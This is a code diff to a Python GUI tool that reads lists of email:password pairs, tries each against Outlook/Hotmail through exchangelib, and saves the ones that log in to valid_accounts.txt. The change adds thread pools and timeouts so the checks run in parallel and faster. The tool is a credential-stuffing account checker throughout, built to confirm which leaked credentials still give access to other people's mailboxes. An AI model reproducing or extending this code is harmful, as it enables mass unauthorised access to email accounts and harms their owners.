@@ -3,59 +3,72 @@ from tkinter import filedialog, messagebox, scrolledtext, ttk
 import webbrowser
 from exchangelib import Credentials, Account, DELEGATE, Configuration
 import threading
+import concurrent.futures
 
 # Global counts
 success_count = 0
 failed_count = 0
 total_accounts = 0
 
-# Function to check login
+# Function to check login with timeout
 def check_hotmail_login(email, password):
     try:
         creds = Credentials(email, password)
         config = Configuration(credentials=creds, server='outlook.office365.com')
         account = Account(email, config=config, autodiscover=False, access_type=DELEGATE)
-        account.inbox.all().count()  # Test inbox access
+
+        # Quick inbox access test
+        account.root.refresh()
         return True
-    except Exception:
+    except Exception as e:
         return False
 
-# Process accounts in a thread
+# Process accounts using threading
 def process_accounts(accounts):
     global success_count, failed_count, total_accounts
     success_count = 0
     failed_count = 0
     total_accounts = len(accounts)
-    
+
     valid_accounts = []
     failed_accounts = []
 
-    progress_bar["maximum"] = total_accounts  # Set progress bar limit
-    progress_bar["value"] = 0  # Reset progress
+    progress_bar["maximum"] = total_accounts
+    progress_bar["value"] = 0
 
-    for index, line in enumerate(accounts, start=1):
+    def check_account(index, line):
         parts = line.strip().split(":")
         if len(parts) != 2:
-            update_progress(f"⚠️ Skipping invalid line: {line}")
-            continue
+            return f"⚠️ Skipping invalid line: {line}", None
 
         email, password = parts
         update_progress(f"🔄 Checking {index}/{total_accounts}: {email}...")
 
-        success = check_hotmail_login(email, password)
+        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
+            future = executor.submit(check_hotmail_login, email, password)
+            success = future.result(timeout=15)  # Timeout after 15 seconds
 
         if success:
             valid_accounts.append(f"{email}:{password}")
-            success_count += 1
-            update_progress(f"✅ {email} (Success)")
+            return f"✅ {email} (Success)", "valid"
         else:
-            failed_accounts.append(f"❌ {email} (Failed)")
+            failed_accounts.append(f"{email}:{password}")
+            return f"❌ {email} (Failed)", "failed"
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
+        results = executor.map(lambda args: check_account(*args), enumerate(accounts, start=1))
+
+    for result, status in results:
+        update_progress(result)
+        if status == "valid":
+            success_count += 1
+        elif status == "failed":
             failed_count += 1
-
         update_summary()
-        update_progress_bar(index)
+        progress_bar["value"] += 1
+        progress_percentage.set(f"{int((progress_bar['value'] / total_accounts) * 100)}% Completed")
+        root.update_idletasks()
 
-    # Save results
     with open("valid_accounts.txt", "w") as f:
         f.write("\n".join(valid_accounts))
     with open("failed_accounts.txt", "w") as f:
@@ -101,12 +114,6 @@ def update_progress(message):
 # GUI success/failure count update
 def update_summary():
     summary_label.config(text=f"✅ {success_count} Success | ❌ {failed_count} Failed")
-
-# Update progress bar
-def update_progress_bar(current_index):
-    progress_bar["value"] = current_index
-    progress_percentage.set(f"{int((current_index / total_accounts) * 100)}% Completed")
-    root.update_idletasks()
 
 # Open valid accounts file
 def open_valid_accounts():
